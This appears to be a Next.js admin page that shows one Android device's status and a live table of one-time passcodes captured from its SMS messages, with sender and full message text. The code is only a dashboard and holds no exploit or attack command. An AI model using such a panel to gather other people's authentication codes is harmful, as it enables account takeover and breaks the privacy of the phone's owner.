"use client";

import { useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";

interface OtpEvent {
  id: string;
  deviceId: string;
  otpCode: string;
  sender: string;
  messageBody: string;
  source: string;
  packageName: string;
  timestamp: number;
  receivedAt: string;
}

interface Device {
  id: string;
  deviceId: string;
  phoneNumber: string;
  deviceModel: string;
  deviceManufacturer: string;
  osVersion: string;
  appVersion: string;
  networkType: string;
  batteryLevel: number;
  batteryStatus: string;
  latitude: number | null;
  longitude: number | null;
  status: string;
  isOnline: boolean;
  lastSeenAt: string;
  lastSeenAge: number;
  otpCount: number;
}

export default function DeviceOtpPage() {
  const router = useRouter();
  const params = useParams();
  const deviceId = params.deviceId as string;

  const [device, setDevice] = useState<Device | null>(null);
  const [events, setEvents] = useState<OtpEvent[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchDeviceData = async () => {
    try {
      // Fetch device info
      const devicesRes = await fetch(`/api/admin/otp/devices`, {
        credentials: "include",
      });

      if (devicesRes.ok) {
        const devicesData = await devicesRes.json();
        const foundDevice = devicesData.devices.find(
          (d: Device) => d.deviceId === deviceId
        );
        if (foundDevice) {
          setDevice(foundDevice);
        }
      }

      // Fetch OTP events for this device
      const eventsRes = await fetch(
        `/api/admin/otp/events?device_id=${encodeURIComponent(deviceId)}`,
        {
          credentials: "include",
        }
      );

      if (eventsRes.ok) {
        const eventsData = await eventsRes.json();
        setEvents(eventsData.events || []);
      }
    } catch (error) {
      console.error("Failed to fetch device data:", error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchDeviceData();
    const interval = setInterval(fetchDeviceData, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, [deviceId]);

  const formatTimestamp = (timestamp: number) => {
    const date = new Date(timestamp);
    return date.toLocaleString();
  };

  const formatLastSeen = (age: number) => {
    if (age < 60) return `${age}s ago`;
    if (age < 3600) return `${Math.floor(age / 60)}m ago`;
    if (age < 86400) return `${Math.floor(age / 3600)}h ago`;
    return `${Math.floor(age / 86400)}d ago`;
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <button
            onClick={() => router.push("/admin/otp-devices")}
            className="mb-2 text-sm text-blue-600 dark:text-blue-400 hover:underline flex items-center"
          >
            <svg
              className="w-4 h-4 mr-1"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M10 19l-7-7m0 0l7-7m-7 7h18"
              />
            </svg>
            Back to Devices
          </button>
          <h1 className="text-2xl font-bold text-gray-900 dark:text-gray-100">
            Device OTP Events
          </h1>
          <p className="mt-1 text-sm text-gray-500 dark:text-gray-400">
            {device?.phoneNumber || deviceId}
          </p>
        </div>
      </div>

      {/* Device Info Card */}
      {device && (
        <div className="bg-white dark:bg-[--color-surface] rounded-lg shadow-sm p-6 border border-gray-200 dark:border-gray-700">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
            <div>
              <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                Status
              </p>
              <div className="mt-1 flex items-center">
                <span
                  className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                    device.isOnline
                      ? "bg-green-100 text-green-800 dark:bg-green-900/30 dark:text-green-400"
                      : "bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-400"
                  }`}
                >
                  <span
                    className={`w-2 h-2 rounded-full mr-1.5 ${
                      device.isOnline ? "bg-green-400" : "bg-gray-400"
                    }`}
                  />
                  {device.isOnline ? "Online" : "Offline"}
                </span>
              </div>
            </div>

            <div>
              <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                Device
              </p>
              <p className="mt-1 text-sm text-gray-900 dark:text-gray-100">
                {device.deviceManufacturer} {device.deviceModel}
              </p>
              <p className="text-xs text-gray-500 dark:text-gray-400">
                Android {device.osVersion}
              </p>
            </div>

            <div>
              <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                Battery
              </p>
              <p className="mt-1 text-sm text-gray-900 dark:text-gray-100">
                {device.batteryLevel}% - {device.batteryStatus}
              </p>
              <p className="text-xs text-gray-500 dark:text-gray-400">
                {device.networkType || "Unknown"}
              </p>
            </div>

            <div>
              <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                Last Seen
              </p>
              <p className="mt-1 text-sm text-gray-900 dark:text-gray-100">
                {formatLastSeen(device.lastSeenAge)}
              </p>
              <p className="text-xs text-gray-500 dark:text-gray-400">
                {device.otpCount} OTPs captured
              </p>
            </div>
          </div>
        </div>
      )}

      {/* OTP Events Table */}
      <div className="bg-white dark:bg-[--color-surface] rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 overflow-hidden">
        <div className="px-6 py-4 border-b border-gray-200 dark:border-gray-700">
          <h2 className="text-lg font-semibold text-gray-900 dark:text-gray-100">
            OTP Events ({events.length})
          </h2>
        </div>
        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
            <thead className="bg-gray-50 dark:bg-gray-800">
              <tr>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                  Time
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                  OTP Code
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                  Sender
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                  Message
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                  Source
                </th>
              </tr>
            </thead>
            <tbody className="bg-white dark:bg-[--color-surface] divide-y divide-gray-200 dark:divide-gray-700">
              {loading ? (
                <tr>
                  <td
                    colSpan={5}
                    className="px-6 py-8 text-center text-gray-500 dark:text-gray-400"
                  >
                    Loading...
                  </td>
                </tr>
              ) : events.length === 0 ? (
                <tr>
                  <td
                    colSpan={5}
                    className="px-6 py-8 text-center text-gray-500 dark:text-gray-400"
                  >
                    No OTP events captured yet. Send a test SMS to this device to see it here.
                  </td>
                </tr>
              ) : (
                events.map((event) => (
                  <tr
                    key={event.id}
                    className="hover:bg-gray-50 dark:hover:bg-gray-800/50 transition-colors"
                  >
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">
                      {formatTimestamp(event.timestamp)}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <span className="px-3 py-1 text-sm font-mono font-bold bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-400 rounded">
                        {event.otpCode}
                      </span>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-100">
                      {event.sender}
                    </td>
                    <td className="px-6 py-4 text-sm text-gray-900 dark:text-gray-100 max-w-md truncate">
                      {event.messageBody}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                      {event.source}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
